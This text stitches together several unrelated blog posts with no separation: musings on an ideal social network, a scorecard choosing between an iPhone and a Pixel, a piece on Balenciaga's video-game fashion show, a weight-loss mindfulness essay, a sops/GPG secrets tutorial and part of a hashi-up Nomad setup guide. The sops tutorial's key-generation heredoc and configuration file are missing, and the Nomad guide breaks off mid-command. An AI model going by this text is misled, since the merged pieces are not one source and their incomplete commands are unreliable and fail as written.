<h2>Moderation</h2>
<p>If we have learned anything from <a href="https://www.pbs.org/newshour/nation/right-wing-users-flock-to-parler-as-social-media-giants-rein-in-misinformation">Parler</a> it is that sometimes it becomes necessary to infringe upon people’s free speech rights especially when these privileges come at the cost of civilised discourse. Still banning people is a slippery slope for example if you ban a terrorist account then what do you do when China asks you to ban accounts of Hong Kong protesters? You have given them the precedent. I think the solution is to have strict moderation but with strong foundational principles and make them clear early on. A good strategy is to only censor people if they are disrespecting other people not when they are expressing their opinions or ideas. Even if you think that the earth is not flat you should let other people talk it out if they are being civil about it.</p>
<p>If you look at communities like <a href="https://news.ycombinator.com/">Hacker News</a>, <a href="https://stackoverflow.com/">Stack Overflow</a>, or the <a href="https://www.reddit.com/r/AskHistorians/">Ask Historians subreddit</a> where the moderators rule with an iron hand you can notice that the posts and comments in these forums are of much higher quality. But still it is anecdotal evidence and these communities are small when you compare them to giants like Facebook and Twitter. Also how would you moderate millions of post? Even if it was possible for human to do it can you rely on them to look at these posts objectively and report them only if they violate the guidelines? I believe if you start a community with strong core values it is possible to motivate people with a little bit of algorithm ingenuity to act in good faith.</p>
<h2>Feed</h2>
<p>Feeds and Algorithms are inextricably linked, feeds serve content curated by algorithms. Feeds can be finite or infinite providing an endless stream of posts and the algorithms used by these can range from simple algorithms that serve posts in chronological order to relatively complex machine learning based recommender systems. Most of the big platforms nowadays use recommender systems coupled with infinite feeds. It can get really messy if a single feed is used to serve both recommended content and the content that the user is subscribed to. YouTube is a good example of this even though they have great recommendations the content that the user has actually subscribed to gets lost in the feed of recommended videos. You might argue that they have a different feed for subscriptions but its not the one they show first when the user enters their app/website and that is the one that actually counts.</p>
<p>For our ideal social network I think it will be better to use two different feed one main finite feed solely for the subscribed/followed content and one infinite feed that recommends content based on the the interests of the user. For the subscription feed I do not think a purely chronological algorithm will work as a post about an important event like a friend’s birthday might get trapped between relatively trivial posts but between the posts of similar importance chronological information can be taken into account. A more complex algorithm will be required for the recommendation feed I will talk about it more in the monetisation section. The goal of the feeds should be to maximise signal from noise and not waste the time of its users.</p>
<h2>Monetisation</h2>
<p>Advertising is a bad and unsustainable business model for social networks, if your main source of revenue are advertisements you will be incentivised to increase user engagement and sometimes even at the cost of the actual experience. The best business model for social networks I think is the Wikipedia model. Ask people who can afford to to pay a nominal subscription to keep the servers running. The success of the company will actually depend how happy its users are with the platform.</p>
<p>You might have noticed that I have used vague terms like ‘algorithmic ingenuity’ and statements like ‘build a system that recommends people posts based on their interests’ without mentioning the specifics of the algorithm that is because I do not know and when it comes to moderation algorithms neither does Twitter. Learning based algorithms are not completely transparent and it is difficult to predict what they are going to do and it becomes even more difficult to come up with good algorithms when the goals of the networks are misaligned with the public good. What my argument is that in social networks that do not depend on advertising money engineers will be actually motivated to come up with better algorithms for moderation and recommendation.</p>
<h2>Interface and Posts</h2>
<p>The whole social network revolves around posts these are the primary content that people use to interact with their subscribers/followers. For Twitter these are limited length messages, for Quora these are questions, for Instagram images, for YouTube videos, etc. The format of these posts is important. They can be designed such that people come up with clever ways to use them (example tweets) and they can also be designed in a more restrictive way such that people struggle to get across what they mean (example tweets).</p>
<p>The ideal post in my opinion is a mixture of these two we could allow people to post both a restricted length post and a full fledged article but nothing in between this leaves space for creativity and does not hamper conversation. An option could be given to the users to sort their feed by articles, shorter posts or both. And instead of like and dislike buttons we can use recommend and not recommend buttons the functions might be same but change in name might help people make conscious decision about whether they want similar content recommended to them or not.</p>
<p>Another way we can improve conversations I think is by giving people a small break between writing a post and actually posting it. This might seem counter-intuitive but I think if given a chance to reflect on things people generally take right decisions and it can also give them time to calm down so that they do not engage in pointless name calling. We can implement it by an optional 15 seconds timer which is enabled by default.</p>
<h2>Conclusion</h2>
<p>The goal of the post is to start a conversation about what an ideal social network might look like. But these are just abstract ideas and musings there is no evidence a social networks like this will be successful but instead of conjecturing about whether things will work or not it is better to try to implement it and see for yourself. In that spirit I am going to try to implement a social network based on these principles. But I am a lone programmer and I need help if some part of my post resonated with you and you think that implementing such a network is worth a try contact me at <a href="mailto:dubeyaayush08@gmail.com">dubeyaayush08@gmail.com</a> and maybe we could team up.</p></section><hr></article></div>]]>

<p>I recently listed <a href="https://www.arencambre.com/2020/12/05/android-is-better-than-iphone/" data-type="post" data-id="3377">17 reasons why iPhones are inferior to Android phone</a>. They are all real. Apple could fix every one of these. But laying out the advantages of either ecosystem, what’s the net value they bring?</p>



<h2>Premise</h2>



<p>This page assesses the value of each of the points where I compare the phone ecosystems. No matter how many points I have in favor of an ecosystem, they are only worth acting on if they have significant value.</p>



<p>Below, I first rate each point primarily on three factors:</p>



<ol><li>Does it help me be a better member of my family?</li><li>Does it help me do paid or volunteer work better?</li><li>Does it help me be smarter or more effective?</li></ol>



<p>If the decision point doesn’t help me with one of these factors, it is not valuable as a decision point.</p>



<p>But if the decision point <em>does</em> help at least one of these factors, then it will contribute to a score that helps with a decision on which ecosystem to move forward with.</p>



<h2>Scorecard</h2>



<p>For each point, I provide some commentary. The <strong>Importance </strong>column is how many of the above factors the point affects. If it affects no factors, then its score is 0. The <strong>Score </strong>column has a 1 if Android is better, -1 if iPhone is better, or 0 if they are about the same. I’ll award a 2 or -2 if one is far better than the other. <strong>Extended </strong>is simply <strong>Importance</strong> * <strong>Score</strong>. The sum of <strong>Extended</strong> is the final score I am going after. If it’s significantly positive, I keep my Pixel 4 XL. If it’s significantly negative, I go with my iPhone 12 Pro Max.</p>



<p>Note that this scoring is mainly based on me comparing a Pixel 4 XL to a iPhone 12 Pro Max. In my <a href="https://www.arencambre.com/2020/12/05/android-is-better-than-iphone/">prior commentary</a>, I was not as device-specific. This is a guide for my own decision. For example, I am not factoring in possibilities of Android phones I do not have, such as the Nexus 5.</p>



<figure><table><tbody><tr><td><strong>Reason and commentary</strong></td><td><strong>Importance</strong></td><td><strong>Score</strong></td><td><strong>Extended</strong></td></tr><tr><td><strong><a href="https://www.arencambre.com/iphone-is-inferior-to-android/#Call_screening_Android_wins">Call screening</a>.</strong> Call-screening is a big deal: interruptions destroy developer productivity. However, iOS apps like <a href="https://www.nomorobo.com/">Nomorobo</a> are only $2 per month. Compared to the value of my time, an outlay of $2 isn’t much different than $0 (since call-screening is built into my Pixel), so I’m calling it a wash.<p>Also, the robocall problem should be largely solved by June 30, 2022, thanks to <a href="https://en.wikipedia.org/wiki/STIR/SHAKEN">STIR/SHAKEN implementation timelines</a>, so that hopefully limits how long I’d need to buy a product.</p></td><td>3</td><td>0</td><td>0</td></tr><tr><td><strong><a href="https://www.arencambre.com/iphone-is-inferior-to-android/#Browser_ad_blocking_Android_wins">Browser ad blocking</a>.</strong> I <em>hate</em> ads. Admittedly, Android’s ad-block advantage only comes from it allowing me to install Firefox. Because iOS allows ad blockers with its bundled browser, it gets a win.</td><td>2</td><td>-1</td><td>-2</td></tr><tr><td><strong><a href="https://www.arencambre.com/iphone-is-inferior-to-android/#YouTube_ad_blocking_Android_wins">YouTube ad blocking</a>.</strong> Android wins this, but I cannot associate it with any objective value to me. YouTube is mostly a time-waster. I should be reading instead.</td><td>0</td><td>2</td><td>0</td></tr><tr><td><strong><a href="https://www.arencambre.com/iphone-is-inferior-to-android/#Universal_back_button_Android_wins">Universal back button</a>.</strong> Android does well with this.</td><td>1</td><td>1</td><td>1</td></tr><tr><td><strong><a href="https://www.arencambre.com/iphone-is-inferior-to-android/#Gestures_Android_wins">Gestures</a>.</strong> They are mostly equivalent except for iOS’s missing back-button gesture.</td><td>1</td><td>1</td><td>1</td></tr><tr><td><strong><a href="https://www.arencambre.com/iphone-is-inferior-to-android/#Exiting_apps_Android_wins">Exiting apps</a>.</strong> While Android’s back gesture is great way to exit apps, I think I use it about as much as I use the swipe up gesture. I’d just need to learn to swipe up exclusively on the iPhone.</td><td>0</td><td>1</td><td>0</td></tr><tr><td><strong><a href="https://www.arencambre.com/iphone-is-inferior-to-android/#Ambient_display_Android_wins">Ambient display</a>.</strong> Being able to glance at my phone is good for a lot of activities. That said, it’s not a strong advantage for Android because I can tap the Apple screen.</td><td>0</td><td>1</td><td>0</td></tr><tr><td><strong><a href="https://www.arencambre.com/iphone-is-inferior-to-android/#Treating_me_like_an_adult_Android_wins">Treating me like an adult</a>.</strong> Annoying, but I can live with it.</td><td>0</td><td>2</td><td>0</td></tr><tr><td><strong><a href="https://www.arencambre.com/iphone-is-inferior-to-android/#Application_organization_Android_wins">Application organization</a>.</strong> Even though Android’s app drawer beats the pants off iOS here, I admit I don’t use it all that much. The apps I use frequently can be placed on my home screen easily.</td><td>0</td><td>2</td><td>0</td></tr><tr><td><strong><a href="https://www.arencambre.com/iphone-is-inferior-to-android/#Text_messaging_from_other_devices_Android_wins">Text messaging from other devices</a>.</strong> This is a big deal. Android’s advantage is attenuated by the possibility of using a Bluetooth keyboard with the phone or an iPad, but sheesh, that’s more complexity.</td><td>2</td><td>1</td><td>2</td></tr><tr><td><strong><a href="https://www.arencambre.com/iphone-is-inferior-to-android/#Bundled_apps_Android_wins">Bundled apps</a>. </strong>While Android win is real, iOS has gotten better about letting me junk Apple’s bundled garbage. Apple still has a lot of work to do here to not be as bad as Samsung. And I can uninstall a lot of the Apple crapware.</td><td>0</td><td>2</td><td>0</td></tr><tr><td><strong><a href="https://www.arencambre.com/iphone-is-inferior-to-android/#Browser_flexibility_Android_wins">Browser flexibility</a>.</strong> This is more philosophical opposition to Apple’s cynical, arbitrary rules than anything else. The main reason I value this is for ad blocking. Fortunately, unlike Android, iOS supports ad blocking on Safari, so iOS gets the win.</td><td>0</td><td>1</td><td>0</td></tr><tr><td><strong><a href="https://www.arencambre.com/iphone-is-inferior-to-android/#Camera_activation_Android_wins">Camera activation</a>.</strong> I am concerned about this. There are many times I’ve needed to catch something quickly, and that is harder with Apple. It’s only a slight advantage.</td><td>2</td><td>.5</td><td>1</td></tr><tr><td><strong><a href="https://www.arencambre.com/iphone-is-inferior-to-android/#Hardware_design_Android_wins">Hardware design</a>.</strong> While the Pixel line of Android has a clear advantage, I can fix Apple’s form-over-function human-hostility with a case, which I do with any phone I have.</td><td>0</td><td>2</td><td>0</td></tr><tr><td><strong><a href="https://www.arencambre.com/iphone-is-inferior-to-android/#Highrefresh_rate_screen_Android_wins">High-refresh rate screen</a>.</strong> This is a true shortcoming of Apple, but I don’t think it affects me.</td><td>0</td><td>1</td><td>0</td></tr><tr><td><strong><a href="https://www.arencambre.com/iphone-is-inferior-to-android/#Digital_assistant_Android_wins">Digital assistant</a>.</strong> About the only thing I use the digital assistant for is dictation. While Android has the clear advantage, I can probably adapt my speech to do better with Siri.</td><td>0</td><td>1</td><td>0</td></tr><tr><td><strong><a href="https://www.arencambre.com/iphone-is-inferior-to-android/#Use_of_standard_cables_Android_wins">Use of standard cables</a>.</strong> Clinging to Lightning cables is super idiotic. But on the net for me, the extra cable load is a one-time deal and won’t increase complexity meaningfully.</td><td>0</td><td>2</td><td>0</td></tr><tr><td><strong><a href="https://www.arencambre.com/iphone-is-inferior-to-android/#Where_iPhone_is_better,_and_barely!">No black crush</a>.</strong> This will help me in low-light scenarios. Admittedly, the low-light scenarios are mostly watching <a href="https://www.youtube.com/c/MattsOffRoadRecovery">Matt’s Off Road Recovery</a> at night, so overcoming this has true value.</td><td>0</td><td>1</td><td>0</td></tr><tr><td><strong><a href="https://www.arencambre.com/iphone-is-inferior-to-android/#Where_iPhone_is_better,_and_barely!">Screen brightness</a>.</strong> The Pixel 4 XL’s brightness is inadequate for outdoor situations. The iPhone fixes that.</td><td>2</td><td>-1</td><td>-2</td></tr><tr><td><strong><a href="https://www.arencambre.com/iphone-is-inferior-to-android/#Where_iPhone_is_better,_and_barely!">Battery life</a>.</strong> The Pixel 4 XL’s battery life is awful. Even if the iPhone’s battery life isn’t all it cracked up to be, it’s still considerably better. The difference is big, but the fact that I can easily make up for the Pixel 4 XL’s weakness with small battery packs attenuates the value score to only a 1.</td><td>3</td><td>-1</td><td>-3</td></tr><tr><td><strong><a href="https://www.arencambre.com/iphone-is-inferior-to-android/#Where_iPhone_is_better,_and_barely!">iMessage compatibility</a>.</strong> This helps with communications with most the people I text.</td><td>3</td><td>-1</td><td>-3</td></tr></tbody></table></figure>



<h2>Verdict</h2>



<p>The final score is -5, which is a significant score in favor of keeping the iPhone.</p>



<p>In the end, it’s not a big deal to switch to Apple.</p>



<p>There is no other phone in the Android ecosystem I am interested in. I will not consider second-rate manufacturers that ruin the Android experience with garbage crapware, like Samsung. OnePlus is a contender, but it’s not quite there for me. While the Pixel 5 has a lot going for it, its weak processor, lack of face unlock, and reliance on an obsolete camera sensor are major marks against it.</p>



<p>The financials will work out. I can recover about 1/4 of the cost of my iPhone by selling my Pixel 4 XL. Also, since the iPhones devalue more slowly, that makes it easier to recover costs by just selling it, should the Pixel 6 or some future OnePlus work out better.</p>

			<h3>Balenciaga created a video game for their Fall/Winter 2021 presentation</h3> 
			<h4>Well, it's not a real video game more like a simulation... But anyway, it's cool!</h4>
			<p><img src="https://fashionweb.io/img/05-balenciaga-videogame.gif" alt="balenciaga video game"></p><p>Due to covid-19 being in full swing the big brands had to think long and hard about what exactly they should do for their collection presentations. Here are the highlights: </p>
			<p>• <a href="https://www.youtube.com/watch?v=RCQxPSNzU2Q" target="_blank" rel="noopener">Prada did a “livestream”</a> of their fashion show which ended with a Q&amp;A with Rick Owens and Miuccia Prada. Prada’s show didn’t look like a real livestream at all, more like a high production recording that took a whole day to film. We don’t mind though, no point having a “live” livestream really. <br>
			• <a href="https://www.twitch.tv/videos/747647002" target="_blank" rel="noopener">Burberry cleverly partnered with Twitch</a> for their livestream.<br>
			• Jacquemus had a socially distanced show in a wheat field and <a href="https://www.youtube.com/watch?v=5vTYQWNFgTU" target="_blank" rel="noopener">livestreamed</a> it.<br>
			• Gucci hosted their own fashion week called “<a href="https://www.guccifest.com/" target="_blank" rel="noopener">GucciFest</a>” collaborating with Gus Van Sant on their 7 part video series. Our attention span didn’t make it past the first episode unfortunately. <br>
			• <a href="https://www.chanel.com/fr/mode/collection/metiers-art-2020-21/" target="_blank" rel="noopener">Chanel had their show in a castle</a> and they only had one guest watching the show: Kristen Stewart. Weeeeeeiiiird. We hope she tested negative...<br>
			• <a href="https://www.youtube.com/watch?v=Wh7ab7-Gf_E" target="_blank" rel="noopener">Celine</a> hired out an empty football stadium in Monaco where Hedi Slimane showed his Gen-Z-friendly collection.<br>
			• <a href="https://www.youtube.com/watch?v=_Cmolbk0EWc" target="_blank" rel="noopener">Acne Studios</a> did a neat livestream at the empty Grand Palais.<br>
			• Balenciaga on the other hand went all in and created an <a href="https://videogame.balenciaga.com/" target="_blank" rel="noopener">online videogame</a> dedicated to their new collection - it’s something we would only expect from Demna Gvasalia. <br></p>

			<p>The game is called <a href="https://videogame.balenciaga.com/" target="_blank" rel="noopener"><i>Afterworld: The Age of Tomorrow</i></a> and it’s a simulation taking you through a digital world that Balenciaga created where the characters are wearing the brand’s Fall/Winter 2021 collection. The entire simulation [we call it a simulation and not a game since you are just walking a pathway instead of playing] takes place for around 15 minutes. It starts with an intro where you roll through the “characters” like in a 90s fighting game detailing the garments in each look [check out the animated GIF above].</p>

			<p>You then transition into a Blade Runner-esque world based in a concrete building perhaps in a big metropolitan city, where the models are showcasing the new collection while standing around, browsing on their phones or taking selfies. </p>

			<p><img src="https://fashionweb.io/img/05-balenciaga-ss21-01.jpg" alt="balenciaga video game still"></p><p>

			<img src="https://fashionweb.io/img/05-balenciaga-ss21-02.jpg" alt="balenciaga video game still"></p><p>

			<img src="https://fashionweb.io/img/05-balenciaga-ss21-03.jpg" alt="balenciaga video game still"></p><p>You then walk through 5 zones, all zones looking apocalyptic. See this “Bringing life back to earth” ad in their game below, indicating a scary future.</p>

			<p><img src="https://fashionweb.io/img/05-balenciaga-ss21-04.jpg" alt="balenciaga video game still"></p><p>

			<img src="https://fashionweb.io/img/05-balenciaga-ss21-05.jpg" alt="balenciaga video game still"></p><p>

			<img src="https://fashionweb.io/img/05-balenciaga-ss21-06.jpg" alt="balenciaga video game still"></p><p>There is a small story in the game and it’s very very much fitting for Balenciaga’s brand and current creative direction. <span>*SPOILER ALERT, highlight to read*</span> <span>We thought the story would end when we arrive to a rave in the forest, but we continued from there, bypassing models dancing high on life </span><span>*SPOILER ALERT OVER*</span></p>
			

			<p>If this was a contest, hands down we would give Balenciaga the golden medal 🥇 for their spring/summer 2021 presentation.</p>

			


			<div>
				<h4><span>FINAL THOUGHTS</span></h4>
				<p>Phew, all these brands’ Marketing and Digital departments must have been sweating hard from all that digital thinking this year. A for effort guys! We will be watching you again in 6 months.</p>

<p>After years of struggling to lose weight, I've lost 30 pounds this year. My number one takeaway has been realizing I need to be mindful of what I eat all day, from eyes open to going to bed.</p>

<p>For years I'd been giving up single things. No soda or juice. No desserts. No chips. No fries. Yet incredibly, whatever I did it didn't make a dent, at least not for long. Which seemed totally impossible.</p>

<p>I'd just cut out thousands of calories! And... nothing. Eventually, I realized it was like pushing down on a waterbed. I'd just end up eating the calories somewhere else. Automatically and without fail.</p>

<div><p><a href="https://lh3.googleusercontent.com/-U2RZSjyEQRU/X8B4u5G8aVI/AAAAAAAFHHQ/_OawWuIiGL0lKvmMWlJnnVeqdd-SUMzJACLcBGAsYHQ/image.png"><img data-original-height="381" data-original-width="750" height="326" src="https://lh3.googleusercontent.com/-U2RZSjyEQRU/X8B4u5G8aVI/AAAAAAAFHHQ/_OawWuIiGL0lKvmMWlJnnVeqdd-SUMzJACLcBGAsYHQ/w640-h326/image.png" width="640"></a></p><p>Maintaining good posture is easy: when you notice you are slumping, sit up straight. The hard part is noticing. What's going on at that moment when you start to slump? The exact moment when your head tilts down or your back starts to curve? Where is your mind right at that moment? How are you letting this happen? I mean what the hell, who is minding the store here?</p></div>

<p>I feel like that's exactly where my mind was when I was making a late-night snack, or grabbing another handful of chips, or digging into another piece of pizza. I was there for those moments in a way, but also not there.</p><p>Honestly, sometimes I felt like a spectator. I'd look at the snack I fixed myself and say, “Boy I should not be eating this,” then I’d sit down and eat it. Afterward, I'd say, “I should not have eaten that”. Can I talk to a manager, is there no one in charge here?</p>

<p>What finally worked was pushing the desire to lose weight down deeply into every fiber of my being, so in those moments I was present, the “I” that I wanted to be was present. Once present, the choice was actually easy. If I'm trying to lose weight, which I am, should I eat this handful of M&amp;M's? No, no I should not.</p>

<p>How to stay present? I did mindfulness meditation for several years, and I think mindfulness is what we are talking about. It's the opposite of mindlessness, and mindlessness is the enemy. What they don't advertise is there are ways to increase mindfulness without meditation. They are just... a little weird.</p>

<p>When you have an itch, even an intense one, just observe it for a while. See what happens. Often it will go away. If it's unbearable then scratch it, but not every time, and not right away.</p>

<p>If you are doing anything rushed, like writing or cleaning or typing your password in wrong, once in a while do it really slow. Like impossibly slow. The other day I was tearing a perforated piece of paper such that I waited for each single pop, then pulled it a bit more. One time I shaved so slowly that I was enjoying listening to the individual whiskers snap.</p>

<p>The goal is not just “do things slowly”. The goal is to catch yourself doing something on auto-pilot and intervene with some deliberate action. To be aware of what you were doing, then modify what you were doing mindfully. It's best to do this for different activities, sporadically. Sense that the auto-pilot has taken over, then do something to disrupt that automatic behavior.</p><p><a href="https://lh3.googleusercontent.com/-fievTLupx7M/X76Ld1UoftI/AAAAAAAFHG8/qIy8zP7hJ3IFRLtE0MkjzJQpY7YMIONlgCLcBGAsYHQ/image.png"><img data-original-height="282" data-original-width="425" height="424" src="https://lh3.googleusercontent.com/-fievTLupx7M/X76Ld1UoftI/AAAAAAAFHG8/qIy8zP7hJ3IFRLtE0MkjzJQpY7YMIONlgCLcBGAsYHQ/w640-h424/image.png" width="640"></a></p>

<p>Sometimes if I'm on a mostly empty road, but I'm following someone too closely, I'll slow WAY down, until they are far in front of me. I've learned that for me this “following behavior” is very automatic.</p>

<p>After there's a gap I resume my exact same speed, but now I'm a constant five seconds behind. It's less stressful and safer, and the only downside is I'll arrive a whopping five seconds after they will. Notice you are doing something, then modify what you are doing.</p>

<p>When I finally put it together there was no grit-your-teeth effort required, it was just being consistently mindful of my goal, and therefore mindful as to whether my behavior was aligned with my goal. It required a light touch, not a heavy lift.</p><p>If “I” was there, I'd make the right decision. If I was on auto-pilot, I'd make the wrong decision. So my goal was no longer really to lose weight, it was simply to always be there.</p>

December 6, 2020 | https://ervinbarta.com/2020/12/05/from-zero-to-encrypted-secrets-in-2-minutes | <a href="https://web.archive.org/web/*/https://ervinbarta.com/2020/12/05/from-zero-to-encrypted-secrets-in-2-minutes">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><p>You probably heard about <a href="https://github.com/mozilla/sops">mozilla/sops</a>, but even if the readme is amazingly detailed, a from-scratch example is always nice to have.</p>

<p><code>sops</code>, in a nutshell, bridges the gap between various key management services (PGP, AWS KMS, GCP KMS, Azure Key Vault) and you.
This post will attempt to get you on your feet as fast as possible, in 3 simple steps: from “<em>I have no idea what to do with my hands</em>” to “<em>No way it’s that easy!</em>”.</p>

<p>Install the dependencies:</p>
<div><div><pre><code><span>$ </span>brew <span>install </span>sops gnupg
</code></pre></div></div>

<p>And run these 3-ish commands to convince yourself:</p>
<div><div><pre><code><span># Clone the example repository</span>
<span>$ </span>git clone https://github.com/ervinb/sops-gpg-example.git
<span>$ </span><span>cd </span>sops-gpg-example

<span># Import the encryption key</span>
<span>## The path is Keybase specific and it will work on any platform - no need to use your local filesystem path</span>
<span>$ </span>gpg <span>--import</span> &lt;<span>(</span>keybase fs <span>read</span> /keybase/team/sopsgpgexample/pgp/key.asc<span>)</span>
<span>## Or if you don't have Keybase set up yet</span>
<span>$ </span>gpg <span>--import</span> &lt;<span>(</span>curl <span>-L</span> https://gist.githubusercontent.com/ervinb/288c44a45cf2614a0684bea333b3aa36/raw/sops-gpg-example.asc<span>)</span>

<span># Decrypt and open the file</span>
<span>$ </span>sops secrets/mysecrets.dev.enc.yaml
</code></pre></div></div>

<p>Your day-to-day interaction with this would be only the last line.</p>

<p><code>gpg --import</code> has to be executed only once, after which the key will be part of the local keychain
(persists reboots as well).
That’s literally all there is to it, after following the below steps.</p>

<h2 id="do-it-yourself">Do it yourself</h2>

<p>Start the stopwatch - we have 2 minutes.</p>

<ol>
  <li>Generate a PGP key
    <div><div><pre><code><span>$ </span> gpg <span>--batch</span> <span>--generate-key</span> <span>&lt;&lt;</span><span>EOF</span><span>

    <p>The key is created without a passphrase because of the <code>%no-protection</code> option. Otherwise a <code>Passphrase: &lt;pass&gt;</code> would be required.</p>
  </li>
  <li>Create a sops configuration file with the key’s fingeprint. This is the ✨ magic ✨ ingredient,
which makes the onboarding so frictionless.
    <div><div><pre><code><span>$ </span>gpg <span>--list-keys</span>

</code></pre></div>    </div>

    <p>This is also perfect if you want more control over the secrets, like using different keys for different environments.
For example <code>secrets/*.dev.enc.yaml</code> could use one key, and <code>secrets/*.prod.enc.yaml</code> another one.

    <p>Then it just a question of distributing the keys to the right people and/or environment.
Which brings us to Keybase.</p>
  </li>
</ol>

<h4 id="note-for-linux-users">Note for Linux users</h4>

<p>I’ve found that both on Fedora and Ubuntu, for whatever reason, creating a new file with <code>sops</code> throws the following cryptic error:</p>

<div><div><pre><code><span>$ </span>sops secrets/new.dev.enc.yaml
&lt;save the file <span>in </span>the editor&gt;
File has not changed, exiting.
</code></pre></div></div>

<p>The solution is to create the file first and encrypt it in-place afterwards:</p>
<div><div><pre><code><span>$ </span>vi secrets/new.dev.enc.yaml
<span>$ </span>sops <span>-i</span> <span>-e</span> secrets/new.dev.enc.yaml
</code></pre></div></div>

<h2 id="distributing-the-key-to-firends-and-family">Distributing the key to firends and family</h2>

<p>To extract the PGP key from your local keychain, use:</p>
<div><div><pre><code><span>$ </span>gpg <span>--list-keys</span>
<span>-------------------------------</span>
pub   rsa2048 2020-12-06 <span>[</span>SC]
      7E6DC556C66C43D928A95EA3715A56B718EAF0B6
uid           <span>[</span>ultimate] Foo Bar
sub   rsa2048 2020-12-06 <span>[</span>E]

<span>$ </span>gpg <span>--armor</span> <span>--export-secret-keys</span> 7E6DC556C66C43D928A95EA3715A56B718EAF0B6 <span>&gt;</span> key.asc
</code></pre></div></div>

<p><code>--armor</code> makes it so that the output is ASCII (<code>.asc</code>) formatted, and not in binary (default).</p>

<p>One of the most seamless ways to distribute keys and other sensitive files is Keybase.
It has a low barrier of entry, and you can control the granularity of access with “teams”.
It also integrates nicely with the filesystem.</p>

<ol>
  <li>Install Keybase
    
  </li>
  <li>Create an account</li>
  <li>Store the secret key under a team’s folder</li>
</ol>

<p>After that, you grab the universal path and import the key to anywhere with <code>gpg</code> installed.</p>

<h2 id="use-it-in-your-applications">Use it in your applications</h2>

<p>To use the decrypted values in your application, you can just add a line to your setup scripts
to run</p>
<div><div><pre><code>sops <span>-d</span> secrets/mysecret.dev.enc.yaml <span>&gt;</span> configuration.yaml
</code></pre></div></div>
<p>(make sure to add the decrypted files to <code>.gitignore</code>)</p>

<p>For Terraform projects use <a href="https://github.com/carlpett/terraform-provider-sops">terraform-sops</a>, and if you’re into Terragrunt,
it has a built-in <a href="https://terragrunt.gruntwork.io/docs/reference/built-in-functions/#sops_decrypt_file">sops_decrypt_file</a> function.</p>

<p>You will be running <code>sops</code> only to create or edit secrets, otherwise, it will be invisible (and incredible).</p>

<p>In this blog post, I will introduce you to a new tool, <a href="https://github.com/jsiebens/hashi-up" title="hashi-up" target="_blank">hashi-up</a>, I created to install a <a href="https://hashicorp.com/" title="HashiCorp" target="_blank">HashiCorp</a> Nomad cluster in a matter of minutes.</p>

<blockquote>
<p>This project is heavily inspired on the work of <a href="https://www.alexellis.io/" target="_blank">Alex Ellis</a> who created <a href="https://k3sup.dev/" target="_blank">k3sup</a>, a tool to to get from zero to KUBECONFIG with <a href="https://k3s.io/" target="_blank">k3s</a></p>
</blockquote>



<p>hashi-up is a lightweight utility to install HashiCorp <a href="https://www.consul.io/" target="_blank">Consul</a> and <a href="https://www.nomadproject.io/" target="_blank">Nomad</a> on any remote Linux host. All you need is <code>ssh</code> access and the binary <code>hashi-up</code> to build a Consul or a Nomad cluster.</p>

<p>The tool is written in Go and is cross-compiled for Linux, Windows, macOS and even on Raspberry Pi.</p>



<p>This tool uses <code>ssh</code> to install HashiCorp <code>Consul</code> or <code>Nomad</code> to a remote Linux host. You can also use it to join existing Linux hosts into a Consul or Nomad cluster. First, <code>Consul</code> or <code>Nomad</code> is installed using a utility script, along with a minimal configuration to run the agent as a server or a client.</p>

<p>hashi-up was developed to automate what can be a very manual and confusing process for many developers, who are already short on time. Once you’ve provisioned a VM with your favourite tooling, <code>hashi-up</code> means you are only 60 seconds away from running <code>nomad status</code> on your computer.</p>

<h2 id="usage">Usage</h2>

<p>The <code>hashi-up</code> tool is a client application which you can run on your computer. It uses SSH to connect to remote servers when installing HashiCorp Consul or Nomad. Binaries are available for macOS, Windows, and Linux (including ARM).</p>

<h3 id="setup-a-single-nomad-server">Setup a single Nomad server</h3>

<p>Provision a new VM with a compatible operating system such as Ubuntu, Debian, Raspbian, or something else. Make sure that you opt-in to copy your registered SSH keys over to the new VM or host automatically.</p>

<blockquote>
<p>Note: You can copy ssh keys to a remote VM with <code>ssh-copy-id user@IP</code>.</p>
</blockquote>

<p>Imagine the IP was <code>192.168.0.100</code> and the username was <code>ubuntu</code>, then you would run this:</p>
<div><pre><code data-lang="bash">export IP<span>=</span><span>192</span>.168.0.100
hashi-up nomad install --ssh-target-addr $IP --ssh-target-user ubuntu --server</code></pre></div>
<p>When the command finishes, try to access Nomad using the UI at <a href="http://192.168.0.100:4646/" target="_blank">http://192.168.100:4646</a> or with the CLI:</p>
<div><pre><code data-lang="bash">nomad agent-info -address<span>=</span>http://192.168.0.100:4646</code></pre></div>
<h3 id="join-some-agents-to-your-nomad-server">Join some agents to your Nomad server</h3>

<p>Let’s say you have a Nomad server up and running; now you can join one or more client agents to the cluster:</p>
<div><pre><code data-lang="bash">export SERVER_IP<span>=</span><span>192</span>.168.0.100
export AGENT_1_IP<span>=</span><span>192</span>.168.0.105
export AGENT_2_IP<span>=</span><span>192</span>.168.0.106

hashi-up nomad install --ssh-target-addr $AGENT_1_IP --ssh-target-user ubuntu --client --retry-join $SERVER_IP
hashi-up nomad install --ssh-target-addr $AGENT_2_IP --ssh-target-user ubuntu --client --retry-join $SERVER_IP</code></pre></div>
<h3 id="create-a-multi-server-ha-setup">Create a multi-server (HA) setup</h3>

<p>Prepare, for example, three nodes and let’s say they have the following IP addresses:</p>

<ul>
<li>192.168.0.100<br></li>
<li>192.168.0.101<br></li>
<li>192.168.0.102</li>
</ul>

<p>With <code>hashi-up</code> it is quite easy to install 3 Nomad servers which will form a cluster:</p>
<div><pre><code data-lang="bash">export SERVER_1_IP<span>=</span><span>192</span>.168.0.100
export SERVER_2_IP<span>=</span><span>192</span>.168.0.101
export SERVER_3_IP<span>=</span><span>192</span>.168.0.102

hashi-up nomad install --ssh-target-addr $SERVER_1_IP --ssh-target-user ubuntu --server --bootstrap-expect <span>3</span> --retry-join $SERVER_1_IP --retry-join $SERVER_2_IP --retry-join $SERVER_3_IP
hashi-up nomad install --ssh-target-addr $SERVER_2_IP --ssh-target-user ubuntu --server --bootstrap-expect <span>3</span> --retry-join $SERVER_1_IP --retry-join $SERVER_2_IP --retry-join $SERVER_3_IP
hashi-up nomad install --ssh-target-addr $SERVER_3_IP --ssh-target-user ubuntu --server --bootstrap-expect <span>3</span> --retry-join $SERVER_1_IP --retry-join $SERVER_2_IP --retry-join $SERVER_3_IP</code></pre></div>
<p>And of course, joining client agents is the same as above:</p>
<div><pre><code data-lang="bash">export SERVER_1_IP<span>=</span><span>192</span>.168.0.100
export SERVER_2_IP<span>=</span><span>192</span>.168.0.101
export SERVER_3_IP<span>=</span><span>192</span>.168.0.102
